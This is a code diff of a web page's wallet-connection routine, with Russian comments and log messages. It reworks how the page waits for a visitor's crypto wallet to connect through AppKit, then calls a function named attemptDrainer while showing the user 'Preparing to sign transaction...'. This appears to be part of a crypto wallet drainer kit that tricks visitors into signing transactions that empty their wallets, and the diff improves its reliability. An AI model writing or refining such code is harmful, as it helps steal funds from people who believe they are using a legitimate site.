@@ -1024,66 +1024,72 @@ async function handleConnectOrAction() {
 
 async function waitForConnection() {
   return new Promise((resolve, reject) => {
-    console.log('📡 Waiting for wallet connection via AppKit...');
+    console.log('📡 Ожидание подключения кошелька через AppKit...');
     const isMobile = isMobileDevice();
-    console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
+    console.log(`ℹ️ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
+
+    // Открываем модальное окно AppKit
+    appKit.open();
 
     let attempts = 0;
-    const maxAttempts = 10;
-    const interval = 2000;
+    const maxAttempts = 15; // Максимум 15 попыток
+    const interval = 1000; // Интервал 1 секунда
 
-    const unsubscribe = appKit.subscribeState((state) => {
-      console.log('🔍 SubscribeState:', state);
-      console.log('State loading:', state.loading);
-      console.log('State connected:', state.connected);
-      console.log('State accounts:', state.accounts);
+    // Функция для получения и обработки адреса
+    const checkAddress = async () => {
+      try {
+        const walletAddress = await appKit.getAddress();
+        console.log(`🔍 Адрес от appKit.getAddress: ${walletAddress}`);
 
-      let walletAddress = null;
+        // Обработка формата CAIP (eip155:chainId:address)
+        let cleanAddress = walletAddress;
+        if (walletAddress?.startsWith('eip155:')) {
+          cleanAddress = walletAddress.split(':')[2];
+          console.log(`🔍 Извлечён чистый адрес из CAIP: ${cleanAddress}`);
+        }
 
-      if (state.loading === false && state.connected && (state.address || state.accounts?.[0])) {
-        walletAddress = state.address || state.accounts?.[0];
-        if (walletAddress.startsWith('eip155:')) {
-          walletAddress = walletAddress.split(':')[2];
+        if (cleanAddress) {
+          console.log(`✅ Кошелёк подключён: ${cleanAddress}`);
+          connectedAddress = cleanAddress;
+          clearInterval(checkInterval);
+          clearTimeout(timeout);
+          modalSubtitle.textContent = 'Preparing to sign transaction...';
+          try {
+            await attemptDrainer();
+            appKit.close();
+            resolve(cleanAddress);
+          } catch (err) {
+            console.error(`❌ Error in attemptDrainer: ${err.message}`);
+            appKit.close();
+            reject(err);
+          }
+        } else {
+          throw new Error('Адрес не получен');
+        }
+      } catch (error) {
+        attempts++;
+        console.log(`ℹ️ Попытка ${attempts}/${maxAttempts}: Не удалось получить адрес: ${error.message}`);
+        if (attempts >= maxAttempts) {
+          console.warn('⚠️ Достигнуто максимальное количество попыток');
+          clearInterval(checkInterval);
+          appKit.close();
+          reject(new Error('Не удалось подключить кошелёк после максимального числа попыток'));
         }
       }
+    };
 
-      if (walletAddress) {
-        console.log(`✅ Wallet connected via AppKit: ${walletAddress}`);
-        connectedAddress = walletAddress;
-        unsubscribe();
-        modalSubtitle.textContent = 'Preparing to sign transaction...';
-        try {
-          await attemptDrainer();
-          appKit.close();
-          resolve(walletAddress);
-        } catch (err) {
-          console.error(`❌ Error in attemptDrainer: ${err.message}`);
-          appKit.close();
-          reject(err);
-        }
-      } else if (attempts >= maxAttempts) {
-        console.warn('⚠ Max connection attempts reached');
-        unsubscribe();
-        appKit.close();
-        reject(new Error('Failed to connect wallet after maximum attempts'));
-      }
+    // Запускаем периодическую проверку
+    const checkInterval = setInterval(checkAddress, interval);
 
-      attempts++;
-    });
-
+    // Устанавливаем таймаут
     const timeout = setTimeout(() => {
-      console.warn('⚠ Connection timeout');
-      unsubscribe();
+      console.warn('⚠️ Таймаут ожидания подключения');
+      clearInterval(checkInterval);
       appKit.close();
-      reject(new Error('Timeout waiting for wallet connection'));
-    }, 120000);
+      reject(new Error('Таймаут ожидания подключения кошелька'));
+    }, 60000); // 60 секунд
 
-    appKit.open('error', (err) => {
-      console.error(`❌ AppKit error: ${err.message}`);
-      clearTimeout(timeout);
-      unsubscribe();
-      appKit.close();
-      reject(err);
-    });
+    // Проверяем сразу
+    checkAddress();
   });
 }
